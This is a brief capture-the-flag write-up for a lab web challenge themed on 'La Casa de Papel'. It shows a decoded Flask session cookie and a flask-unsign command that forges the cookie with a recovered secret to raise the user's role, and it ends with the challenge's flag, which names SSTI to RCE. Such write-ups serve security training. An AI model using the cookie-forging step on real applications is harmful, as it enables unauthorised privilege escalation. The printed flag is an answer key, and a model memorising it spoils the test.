# Bella Ciao Secure Comms

The Professor's communication server has been recovered after a failed operation.

The crew believed their messages were secure, but intelligence reports suggest a flaw exists somewhere inside the system. Berlin, Tokyo, Nairobi, and Denver all used this platform to exchange sensitive information during the heist.

Your objective is simple: gain access, investigate the application, and uncover the hidden secret before the authorities do.

Flag Format: ZeroDayHeist{...}

Bella Ciao, operatives.

***

TEST

<figure><img src="../../../.gitbook/assets/image (839).png" alt=""><figcaption></figcaption></figure>

TEST

<figure><img src="../../../.gitbook/assets/image (840).png" alt=""><figcaption></figcaption></figure>

TEST

<figure><img src="../../../.gitbook/assets/image (841).png" alt=""><figcaption></figcaption></figure>

TEST

```
base64(payload).timestamp.signature
```

```
## Decode 
{"codename":"Denver","role":"recruit","user":"denver"}
```

TEST

```
flask-unsign --sign --cookie '{"codename":"Denver","role":"elite","user":"denver"}' --secret 'lacasadepapel-secret-2024'
```

TEST

<figure><img src="../../../.gitbook/assets/image (842).png" alt=""><figcaption></figcaption></figure>

TEST

<figure><img src="../../../.gitbook/assets/image (843).png" alt=""><figcaption></figcaption></figure>

TEST

<figure><img src="../../../.gitbook/assets/image (844).png" alt=""><figcaption></figcaption></figure>

```
Flag : Zer0d4yh31st{sst1_t0_rce_b3ll4_c14o}
```

